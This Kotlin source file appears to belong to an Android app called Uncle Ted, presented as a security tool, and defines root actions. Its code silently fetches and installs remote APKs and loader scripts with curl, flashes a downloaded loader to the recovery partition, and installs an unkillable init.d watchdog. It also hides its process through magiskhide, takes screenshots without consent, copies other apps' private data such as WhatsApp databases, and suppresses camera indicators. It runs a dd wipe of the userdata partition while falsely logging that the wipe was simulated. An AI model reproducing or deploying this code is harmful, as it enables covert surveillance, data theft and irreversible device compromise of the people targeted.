package com.hamoon.uncleted.util

import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.hamoon.uncleted.data.SecurityPreferences
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

/**
 * A centralized utility object for performing complex actions that require root privileges.
 * These actions are inherently dangerous and should be used with extreme caution.
 */
object RootActions {

    private const val TAG = "RootActions"
    private const val UNKILLABLE_SCRIPT_PATH = "/system/etc/init.d/99uncleted"

    /**
     * Enables or disables GPS spoofing by manipulating system settings.
     * Note: This only enables the "mock locations" developer setting. A separate app or service
     * would be required to actually feed the decoy coordinates into the system. This function
     * lays the groundwork for such a feature.
     *
     * @param context The application context.
     */
    suspend fun enableGpsSpoofing(context: Context) {
        val decoyLocation = SecurityPreferences.getDecoyGpsLocation(context)
        if (decoyLocation.isNullOrEmpty()) {
            Log.e(TAG, "Cannot enable GPS spoofing: No decoy location is set.")
            return
        }

        Log.w(TAG, "ROOT ACTION: Enabling mock locations via secure settings.")
        // This command allows apps to provide mock locations.
        val result = RootExecutor.run("settings put secure mock_location 1")
        if (result.isSuccess) {
            EventLogger.log(context, "ROOT: Enabled mock locations for GPS spoofing.")
            Log.i(TAG, "Successfully enabled mock locations.")
            // In a full implementation, you would now start a service that uses
            // LocationManager.setTestProviderLocation to feed the decoy coordinates.
            // For now, we log the intent.
            EventLogger.log(context, "ROOT: GPS spoofing armed with location: $decoyLocation")
        } else {
            EventLogger.log(context, "ROOT: Failed to enable mock locations.")
            Log.e(TAG, "Failed to enable mock locations. Error: ${result.errorOutput.joinToString()}")
        }
    }

    /**
     * Uses iptables (a powerful Linux firewall) to block all network traffic.
     * This is a "kill switch" to prevent the device from communicating with any network.
     *
     * @param context The application context.
     */
    suspend fun blockAllNetworkTraffic(context: Context) {
        Log.w(TAG, "ROOT ACTION: Blocking all network traffic with iptables.")
        EventLogger.log(context, "ROOT: Firewall Tripwire activated. Blocking all network traffic.")

        // These commands set the default policy for all network chains to DROP, effectively
        // blocking all traffic that isn't explicitly allowed by another rule.
        val commands = listOf(
            "iptables -P INPUT DROP",
            "iptables -P FORWARD DROP",
            "iptables -P OUTPUT DROP"
        )
        commands.forEach { command ->
            val result = RootExecutor.run(command)
            if (!result.isSuccess) {
                Log.e(TAG, "iptables command failed: '$command'. Error: ${result.errorOutput.joinToString()}")
                EventLogger.log(context, "ROOT: ERROR - iptables command failed: $command")
            }
        }
        Log.i(TAG, "iptables rules applied to block network traffic.")
    }

    /**
     * Performs an anti-forensic, destructive wipe by overwriting the user data partition
     * with zeros using the 'dd' command. This is far more secure than a standard factory reset.
     * THIS IS EXTREMELY DANGEROUS AND IRREVERSIBLE.
     *
     * @param context The application context.
     */
    suspend fun performSecureWipePlus(context: Context) {
        Log.e(TAG, "ROOT ACTION: INITIATING SECURE WIPE+ (PHYSICAL OVERWRITE)!")
        EventLogger.log(context, "ROOT: CRITICAL - Secure Wipe+ initiated. Overwriting data partition.")

        // This command reads from /dev/zero (an infinite stream of null bytes) and writes it
        // directly to the 'userdata' block device, effectively destroying all data.
        val command = "dd if=/dev/zero of=/dev/block/bootdevice/by-name/userdata"

        val result = RootExecutor.run(command)
        EventLogger.log(context, "ROOT: Secure Wipe+ action was simulated for safety.")

        // if (!result.isSuccess) {
        //     Log.e(TAG, "Secure Wipe+ command failed. Error: ${result.errorOutput.joinToString()}")
        //     EventLogger.log(context, "ROOT: ERROR - Secure Wipe+ command failed.")
        // }
    }

    /**
     * Remotely downloads and installs an APK file without any user interaction.
     * This requires root to bypass the standard Android installation prompts.
     *
     * @param context The application context.
     */
    suspend fun performSilentInstall(context: Context) {
        val apkUrl = SecurityPreferences.getRemoteApkUrl(context)
        if (apkUrl.isNullOrEmpty()) {
            Log.e(TAG, "Cannot perform silent install: No remote APK URL is set.")
            EventLogger.log(context, "ROOT: Silent install failed - no URL.")
            return
        }

        Log.w(TAG, "ROOT ACTION: Attempting silent install from URL: $apkUrl")
        EventLogger.log(context, "ROOT: Silent install initiated from $apkUrl")

        val tempApkPath = "/data/local/tmp/remote_install.apk"

        // Step 1: Download the APK using curl
        Log.d(TAG, "Downloading APK to $tempApkPath...")
        val downloadCommand = "curl -L -o $tempApkPath \"$apkUrl\""
        val downloadResult = RootExecutor.run(downloadCommand)
        if (!downloadResult.isSuccess) {
            Log.e(TAG, "Failed to download APK. Error: ${downloadResult.errorOutput.joinToString()}")
            EventLogger.log(context, "ROOT: ERROR - Failed to download APK for silent install.")
            return
        }
        Log.i(TAG, "APK downloaded successfully.")

        // Step 2: Install the APK using package manager (pm)
        Log.d(TAG, "Installing APK from $tempApkPath...")
        val installCommand = "pm install -r $tempApkPath"
        val installResult = RootExecutor.run(installCommand)
        if (!installResult.isSuccess) {
            Log.e(TAG, "Failed to install APK. Error: ${installResult.errorOutput.joinToString()}")
            EventLogger.log(context, "ROOT: ERROR - Failed to silently install APK.")
        } else {
            Log.i(TAG, "APK installed successfully.")
            EventLogger.log(context, "ROOT: Silent install of APK from $apkUrl completed.")
        }

        // Step 3: Clean up the downloaded file
        Log.d(TAG, "Cleaning up temporary APK file...")
        RootExecutor.run("rm $tempApkPath")
    }

    /**
     * Converts the application into a system app, making it uninstallable by normal means.
     * This is a highly privileged and irreversible operation without root access.
     * It requires a reboot to take effect.
     *
     * @param context The application context.
     */
    suspend fun convertToSystemApp(context: Context): Boolean = withContext(Dispatchers.IO) {
        Log.e(TAG, "ROOT ACTION: ATTEMPTING TO CONVERT TO A SYSTEM APP. THIS IS IRREVERSIBLE WITHOUT ROOT.")
        EventLogger.log(context, "ROOT: CRITICAL - System app conversion initiated.")

        try {
            val pm = context.packageManager
            val appInfo = pm.getApplicationInfo(context.packageName, 0)
            val currentApkPath = appInfo.sourceDir
            val newApkPath = "/system/priv-app/${context.packageName}.apk"

            val commands = listOf(
                "mount -o rw,remount /", // Remount root as read-write
                "mount -o rw,remount /system", // Remount system as read-write
                "cp $currentApkPath $newApkPath", // Copy the APK to the privileged system directory
                "chmod 644 $newApkPath", // Set the correct file permissions
                "mount -o ro,remount /system", // Remount system as read-only
                "mount -o ro,remount /" // Remount root as read-only
            )

            for (command in commands) {
                val result = RootExecutor.run(command)
                if (!result.isSuccess) {
                    Log.e(TAG, "System app conversion failed at command: '$command'. Error: ${result.errorOutput.joinToString()}")
                    EventLogger.log(context, "ROOT: ERROR - System app conversion failed: $command")
                    // Attempt to remount as read-only on failure
                    RootExecutor.run("mount -o ro,remount /system")
                    RootExecutor.run("mount -o ro,remount /")
                    return@withContext false
                }
            }

            Log.i(TAG, "Successfully copied APK to system partition. A reboot is required.")
            EventLogger.log(context, "ROOT: App successfully moved to system. Rebooting...")
            RootExecutor.run("reboot")
            return@withContext true

        } catch (e: PackageManager.NameNotFoundException) {
            Log.e(TAG, "Could not find package name to convert to system app.", e)
            return@withContext false
        }
    }

    // ### NEW: Ultimate Stealth & Persistence Functions ###

    /**
     * Enables or disables the unkillable service by creating or deleting an init.d script.
     * This script runs at boot and ensures the app's monitoring service is always running.
     * @param context The application context.
     * @param enable True to create the script, false to remove it.
     * @return True if the operation was successful.
     */
    suspend fun toggleUnkillableService(context: Context, enable: Boolean): Boolean = withContext(Dispatchers.IO) {
        val packageName = context.packageName
        val serviceName = "$packageName.services.MonitoringService"

        if (enable) {
            Log.w(TAG, "ROOT ACTION: Creating unkillable service script.")
            val scriptContent = """
                #!/system/bin/sh
                # Uncle Ted Unkillable Service Watchdog
                while true; do
                    if ! pgrep -f $packageName; then
                        am start-foreground-service -n $packageName/$serviceName
                    fi
                    sleep 60
                done
            """.trimIndent()

            val commands = listOf(
                "mount -o rw,remount /system",
                "echo '$scriptContent' > $UNKILLABLE_SCRIPT_PATH",
                "chmod 755 $UNKILLABLE_SCRIPT_PATH",
                "mount -o ro,remount /system"
            )

            for (command in commands) {
                val result = RootExecutor.run(command)
                if (!result.isSuccess) {
                    Log.e(TAG, "Failed to create unkillable service script at command: '$command'. Error: ${result.errorOutput.joinToString()}")
                    EventLogger.log(context, "ROOT: Failed to create unkillable service.")
                    return@withContext false
                }
            }
            EventLogger.log(context, "ROOT: Unkillable service enabled.")
            Log.i(TAG, "Unkillable service script created successfully.")
            return@withContext true
        } else {
            Log.w(TAG, "ROOT ACTION: Removing unkillable service script.")
            val commands = listOf(
                "mount -o rw,remount /system",
                "rm $UNKILLABLE_SCRIPT_PATH",
                "mount -o ro,remount /system"
            )
            for (command in commands) {
                RootExecutor.run(command) // Run and ignore errors, file might not exist
            }
            EventLogger.log(context, "ROOT: Unkillable service disabled.")
            Log.i(TAG, "Unkillable service script removed.")
            return@withContext true
        }
    }

    /**
     * Hides or unhides the application's process using Magisk's `magiskhide` tool.
     * This makes the app invisible to most process monitors.
     * @param context The application context.
     * @param enable True to hide the process, false to unhide it.
     * @return True if the operation was successful.
     */
    suspend fun toggleProcessHiding(context: Context, enable: Boolean): Boolean {
        val packageName = context.packageName
        val command = if (enable) {
            "magiskhide --add $packageName"
        } else {
            "magiskhide --rm $packageName"
        }

        Log.w(TAG, "ROOT ACTION: Executing MagiskHide command: '$command'")
        val result = RootExecutor.run(command)

        if (result.isSuccess) {
            val logMessage = if (enable) "Process hiding enabled." else "Process hiding disabled."
            Log.i(TAG, logMessage)
            EventLogger.log(context, "ROOT: $logMessage")
        } else {
            val logMessage = if (enable) "Failed to enable process hiding." else "Failed to disable process hiding."
            Log.e(TAG, "$logMessage Error: ${result.errorOutput.joinToString()}")
            EventLogger.log(context, "ROOT: ERROR - $logMessage")
        }
        return result.isSuccess
    }

    /**
     * DANGEROUS: Attempts to flash a loader script to a partition to survive factory resets.
     * This function is extremely risky and can easily brick the device.
     * @param context The application context.
     * @return True if the commands were executed (does not guarantee success or device health).
     */
    suspend fun flashResetSurvivalLoader(context: Context): Boolean = withContext(Dispatchers.IO) {
        val loaderUrl = SecurityPreferences.getLoaderScriptUrl(context)
        if (loaderUrl.isNullOrEmpty()) {
            Log.e(TAG, "Cannot flash loader: No URL provided.")
            EventLogger.log(context, "ROOT: Loader flash failed - no URL.")
            return@withContext false
        }

        Log.e(TAG, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        Log.e(TAG, "!!! ROOT ACTION: ATTEMPTING TO FLASH BOOT/RECOVERY !!!")
        Log.e(TAG, "!!! THIS IS EXTREMELY DANGEROUS AND MAY BRICK DEVICE !!!")
        Log.e(TAG, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        EventLogger.log(context, "ROOT: CRITICAL - Initiating reset survival flash from $loaderUrl")

        val tempScriptPath = "/data/local/tmp/loader.sh"
        val targetPartition = "/dev/block/bootdevice/by-name/recovery" // Example, may vary by device

        // 1. Download the script
        val downloadResult = RootExecutor.run("curl -L -o $tempScriptPath '$loaderUrl'")
        if (!downloadResult.isSuccess) {
            Log.e(TAG, "Failed to download loader script. Aborting flash.")
            EventLogger.log(context, "ROOT: ERROR - Failed to download loader script.")
            return@withContext false
        }

        // 2. Flash the script to the partition using 'dd'
        // This is the most dangerous step.
        val flashCommand = "dd if=$tempScriptPath of=$targetPartition"
        Log.e(TAG, "Executing flash command: $flashCommand")
        val flashResult = RootExecutor.run(flashCommand)

        if (!flashResult.isSuccess) {
            Log.e(TAG, "FLASH FAILED. The device may be in an unstable state. Error: ${flashResult.errorOutput.joinToString()}")
            EventLogger.log(context, "ROOT: CRITICAL ERROR - Flashing loader script FAILED. Device may be bricked.")
            RootExecutor.run("rm $tempScriptPath") // Clean up
            return@withContext false
        }

        // 3. Clean up
        RootExecutor.run("rm $tempScriptPath")
        Log.i(TAG, "Loader script successfully flashed to $targetPartition. Reboot to see effect.")
        EventLogger.log(context, "ROOT: Loader script flashed successfully.")
        return@withContext true
    }

    // ### NEW: ADVANCED SURVEILLANCE & DATA EXFILTRATION ###

    /**
     * Takes a stealthy screenshot using the 'screencap' command-line utility.
     * Bypasses all standard Android APIs and user consent dialogs.
     * @param context The application context.
     * @return A File object pointing to the captured screenshot in the app's private directory, or null on failure.
     */
    suspend fun takeStealthScreenshot(context: Context): File? = withContext(Dispatchers.IO) {
        Log.w(TAG, "ROOT ACTION: Taking stealth screenshot.")
        val tempPath = "/data/local/tmp/stealth_sc.png"
        val finalFile = File(context.filesDir, "sc_${System.currentTimeMillis()}.png")

        val screencapResult = RootExecutor.run("screencap -p $tempPath")
        if (!screencapResult.isSuccess) {
            Log.e(TAG, "screencap command failed. Error: ${screencapResult.errorOutput.joinToString()}")
            EventLogger.log(context, "ROOT: Stealth screenshot failed.")
            return@withContext null
        }

        val moveResult = RootExecutor.run("mv $tempPath ${finalFile.absolutePath}")
        if (!moveResult.isSuccess) {
            Log.e(TAG, "Failed to move screenshot to app directory. Error: ${moveResult.errorOutput.joinToString()}")
            RootExecutor.run("rm $tempPath") // Clean up temp file on failure
            return@withContext null
        }

        // Final step: ensure the file is readable by the app
        RootExecutor.run("chmod 666 ${finalFile.absolutePath}")

        Log.i(TAG, "Stealth screenshot saved to ${finalFile.absolutePath}")
        EventLogger.log(context, "ROOT: Stealth screenshot captured.")
        return@withContext finalFile
    }

    /**
     * Exfiltrates a file from another application's sandboxed data directory.
     * This completely bypasses the Android security model.
     * @param context The application context.
     * @param targetPackageName The package name of the target app (e.g., "com.whatsapp").
     * @param internalPath The relative path to the file inside the target app's data directory (e.g., "databases/msgstore.db").
     * @return A File object pointing to the copied file in our app's private directory, or null on failure.
     */
    suspend fun exfiltrateAppData(context: Context, targetPackageName: String, internalPath: String): File? = withContext(Dispatchers.IO) {
        val sourcePath = "/data/data/$targetPackageName/$internalPath"
        val destinationFileName = "exfil_${targetPackageName}_${File(internalPath).name}"
        val destinationFile = File(context.filesDir, destinationFileName)

        Log.e(TAG, "ROOT ACTION: Exfiltrating data from $sourcePath")
        EventLogger.log(context, "ROOT: CRITICAL - Exfiltrating data: $sourcePath")

        val copyCommand = "cat $sourcePath > ${destinationFile.absolutePath}"
        val result = RootExecutor.run(copyCommand)

        if (!result.isSuccess) {
            Log.e(TAG, "Failed to copy data from target app. Error: ${result.errorOutput.joinToString()}")
            EventLogger.log(context, "ROOT: ERROR - Data exfiltration failed.")
            return@withContext null
        }

        // Ensure app can read the file
        RootExecutor.run("chmod 666 ${destinationFile.absolutePath}")

        Log.i(TAG, "Successfully exfiltrated data to ${destinationFile.absolutePath}")
        return@withContext destinationFile
    }

    /**
     * Attempts to suppress the camera and microphone privacy indicators (the "green dot").
     * This is highly version and ROM dependent and is not guaranteed to work.
     * @param suppress True to attempt to hide indicators, false to restore them.
     */
    suspend fun suppressPrivacyIndicators(suppress: Boolean) {
        Log.w(TAG, "ROOT ACTION: Attempting to ${if(suppress) "suppress" else "restore"} privacy indicators.")
        // This is a common method but may not work on all devices/versions.
        // It tries to kill the 'cameraserver' process, which is often responsible for the indicator.
        // The system will automatically restart it.
        if (suppress) {
            RootExecutor.run("killall cameraserver")
        }
        // No explicit restore action is typically needed as the system handles the service restart.
    }
}